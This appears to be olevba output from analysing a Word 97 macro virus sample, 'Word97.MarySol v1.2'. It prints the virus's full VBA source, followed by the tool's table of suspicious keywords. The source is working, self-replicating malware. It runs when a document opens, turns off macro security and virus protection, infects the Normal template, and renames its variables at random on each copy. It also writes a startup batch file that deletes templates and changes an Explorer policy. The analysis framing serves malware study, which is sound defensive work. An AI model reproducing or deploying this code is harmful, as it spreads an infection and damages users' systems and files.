olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mary.b-47d69210881d9c6f576c9f2c48311274c5020ef7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mary.b-47d69210881d9c6f576c9f2c48311274c5020ef7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Word97.MarySol v1.2
'(c) 1999 cry0tek

Private Sub Document_Open()
'MarySol
On Error Resume Next
Dim varray(1 To 14) As String
Dim Wt4Kg7Bj8Mu2Zx1Ih6Xt1 As Long: Dim Kn7Qv0Rf8Wv1Uk3Ie6Aj4La6 As Long: Dim Xq4Aq6Yb2Zg1Xt7Ar6Lc7Hq5Ay5 As Long: Dim Ia4Dr7Jb2Bm7Pz6Zf0In2Jk9Me6 As Long
If Left(Application.Version, 1) > 9 Then
 CommandBars("Macro").Controls("Security...").Delete
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
 Options.VirusProtection = (1 - 1)
End If
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
Options.SaveNormalPrompt = (1 - 1): Options.ConfirmConversions = (1 - 1): Application.EnableCancelKey = (1 - 1)
Application.ScreenUpdating = (1 - 1): Application.ShowVisualBasicEditor = (1 - 1)
If System.OperatingSystem = "Windows" And System.LanguageDesignation = "English (United States)" Then
 Xt0Je2Bv5Gg6Rm9Ix0Ot4Yr9Rg6Aq1 = GetAttr(NormalTemplate.FullName)
 If Xt0Je2Bv5Gg6Rm9Ix0Ot4Yr9Rg6Aq1 = vbReadOnly Then GoTo Yd3Ol3Hn6Sg8Kd1Lp8Ti1Kq8Lw7
 If Xt0Je2Bv5Gg6Rm9Ix0Ot4Yr9Rg6Aq1 = vbReadOnly + vbArchive Then GoTo Yd3Ol3Hn6Sg8Kd1Lp8Ti1Kq8Lw7
End If
Set Br6Jk8Hk1Nv4Ea8Rs4Tg8 = ActiveDocument.VBProject.VBComponents.Item(1).Codemodule
Set Qj6Zf5Dl7Zr5Bv5Vi5Jt0Mx3Ch7Xh3 = NormalTemplate.VBProject.VBComponents.Item(1).Codemodule
If Br6Jk8Hk1Nv4Ea8Rs4Tg8.Lines(5, 1) <> "'MarySol" Then
 Br6Jk8Hk1Nv4Ea8Rs4Tg8.DeleteLines 1, _
 Br6Jk8Hk1Nv4Ea8Rs4Tg8.CountOfLines
 Br6Jk8Hk1Nv4Ea8Rs4Tg8.InsertLines 1, Qj6Zf5Dl7Zr5Bv5Vi5Jt0Mx3Ch7Xh3.Lines _
 (1, Qj6Zf5Dl7Zr5Bv5Vi5Jt0Mx3Ch7Xh3.CountOfLines)
 Br6Jk8Hk1Nv4Ea8Rs4Tg8.ReplaceLine 4, Chr(80) + Chr(114) + Chr(105) + Chr(118) + Chr(97) + Chr(116) + Chr(101) + Chr(32) + _
 Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + _
 Chr(110) + Chr(116) + Chr(95) + Chr(79) + Chr(112) + Chr(101) + Chr(110) + Chr(40) + Chr(41)
End If
If Qj6Zf5Dl7Zr5Bv5Vi5Jt0Mx3Ch7Xh3.Lines(5, 1) <> "'MarySol" Then
 Randomize
 varray(1) = "Xt0Je2Bv5Gg6Rm9Ix0Ot4Yr9Rg6Aq1": varray(2) = "Br6Jk8Hk1Nv4Ea8Rs4Tg8": varray(3) = "Qj6Zf5Dl7Zr5Bv5Vi5Jt0Mx3Ch7Xh3": varray(4) = "Wt4Kg7Bj8Mu2Zx1Ih6Xt1": varray(5) = "Kn7Qv0Rf8Wv1Uk3Ie6Aj4La6": varray(6) = "Xq4Aq6Yb2Zg1Xt7Ar6Lc7Hq5Ay5": varray(7) = "Ia4Dr7Jb2Bm7Pz6Zf0In2Jk9Me6"
 varray(8) = "Yd3Ol3Hn6Sg8Kd1Lp8Ti1Kq8Lw7": varray(9) = "Fm8": varray(10) = "Kr4Tl5Yk8Fe9": varray(11) = "Lh7Tu1Ki7Qc1": varray(12) = "Ir5Qc8Lq0Oc0Fv9Dc2St9Fi1Iq7": varray(13) = "Wv2Ln0Ai5Uz9Nv1Bd8": varray(14) = "Ku0Yj6"
 For i = 1 To 14
  For j = 1 To Int((10 * Rnd) + 1)
   PolyVal = PolyVal + Chr(65 + Int(Rnd * 26)) & Chr(122 - Int(Rnd * 26)) & Chr(48 + Int(Rnd * 10))
  Next j
  With Br6Jk8Hk1Nv4Ea8Rs4Tg8
   Wt4Kg7Bj8Mu2Zx1Ih6Xt1 = 1: Kn7Qv0Rf8Wv1Uk3Ie6Aj4La6 = 1: Xq4Aq6Yb2Zg1Xt7Ar6Lc7Hq5Ay5 = .CountOfLines: Ia4Dr7Jb2Bm7Pz6Zf0In2Jk9Me6 = Len(.Lines(.CountOfLines, 1))
   Do While .Find(varray(i), Wt4Kg7Bj8Mu2Zx1Ih6Xt1, Kn7Qv0Rf8Wv1Uk3Ie6Aj4La6, Xq4Aq6Yb2Zg1Xt7Ar6Lc7Hq5Ay5, Ia4Dr7Jb2Bm7Pz6Zf0In2Jk9Me6, True)
    strVal = .Lines(Wt4Kg7Bj8Mu2Zx1Ih6Xt1, 1)
    strVal = Left(strVal, Kn7Qv0Rf8Wv1Uk3Ie6Aj4La6 - 1) & PolyVal & Mid(strVal, Ia4Dr7Jb2Bm7Pz6Zf0In2Jk9Me6)
    .ReplaceLine Wt4Kg7Bj8Mu2Zx1Ih6Xt1, strVal
    Wt4Kg7Bj8Mu2Zx1Ih6Xt1 = Xq4Aq6Yb2Zg1Xt7Ar6Lc7Hq5Ay5 + 1: Kn7Qv0Rf8Wv1Uk3Ie6Aj4La6 = 1
    Xq4Aq6Yb2Zg1Xt7Ar6Lc7Hq5Ay5 = .CountOfLines: Ia4Dr7Jb2Bm7Pz6Zf0In2Jk9Me6 = Len(.Lines(.CountOfLines, 1))
   Loop
  End With
  PolyVal = ""
 Next i
 Qj6Zf5Dl7Zr5Bv5Vi5Jt0Mx3Ch7Xh3.DeleteLines 1, _
 Qj6Zf5Dl7Zr5Bv5Vi5Jt0Mx3Ch7Xh3.CountOfLines
 Qj6Zf5Dl7Zr5Bv5Vi5Jt0Mx3Ch7Xh3.InsertLines 1, Br6Jk8Hk1Nv4Ea8Rs4Tg8.Lines _
 (1, Br6Jk8Hk1Nv4Ea8Rs4Tg8.CountOfLines)
 Qj6Zf5Dl7Zr5Bv5Vi5Jt0Mx3Ch7Xh3.ReplaceLine 4, Chr(80) + Chr(114) + Chr(105) + Chr(118) + Chr(97) + Chr(116) + Chr(101) + Chr(32) + _
 Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(68) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + _
 Chr(110) + Chr(116) + Chr(95) + Chr(67) + Chr(108) + Chr(111) + Chr(115) + Chr(101) + Chr(40) + Chr(41)
End If
If Qj6Zf5Dl7Zr5Bv5Vi5Jt0Mx3Ch7Xh3.CountOfLines <> 0 And Br6Jk8Hk1Nv4Ea8Rs4Tg8.CountOfLines = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
If Day(Now) = Minute(Now) Then
 Select Case Day(Now)
  Case 3 And Int((15 * Rnd) + 1) = 1
   Application.StatusBar = "Word97.MarySol v1.2"
  Case 12 And Int((30 * Rnd) + 1) = 1
   With Assistant.NewBalloon
    .Heading = "Word97.MarySol v1.2"
    .Text = "So many questions, but the answers are so few..." & vbCr & vbCr
    .Animation = 22
    .Show
   End With
  Case 21 And Int((45 * Rnd) + 1) = 1
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoClose") = 1&
 End Select
End If
Exit Sub
Yd3Ol3Hn6Sg8Kd1Lp8Ti1Kq8Lw7:
Fm8 = NormalTemplate
Ku0Yj6 = "c:\windows\startm~1\programs\startup\msexec.bat"
Kr4Tl5Yk8Fe9 = "attrib -h -r "
Lh7Tu1Ki7Qc1 = "c:\progra~1\micros~1\templa~1\"
Ir5Qc8Lq0Oc0Fv9Dc2St9Fi1Iq7 = "c:\progra~1\micros~2\templa~1\"
Wv2Ln0Ai5Uz9Nv1Bd8 = "del "
Open Ku0Yj6 For Append Access Write As #1
Print #1, vbCr + vbLf + "@echo off"
Print #1, Kr4Tl5Yk8Fe9 + Lh7Tu1Ki7Qc1 + Fm8
Print #1, Kr4Tl5Yk8Fe9 + Ir5Qc8Lq0Oc0Fv9Dc2St9Fi1Iq7 + Fm8
Print #1, Wv2Ln0Ai5Uz9Nv1Bd8 + Lh7Tu1Ki7Qc1 + Fm8
Print #1, Wv2Ln0Ai5Uz9Nv1Bd8 + Ir5Qc8Lq0Oc0Fv9Dc2St9Fi1Iq7 + Fm8
Print #1, "cls"
Print #1, Wv2Ln0Ai5Uz9Nv1Bd8 + Ku0Yj6
Close 1
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |msexec.bat          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

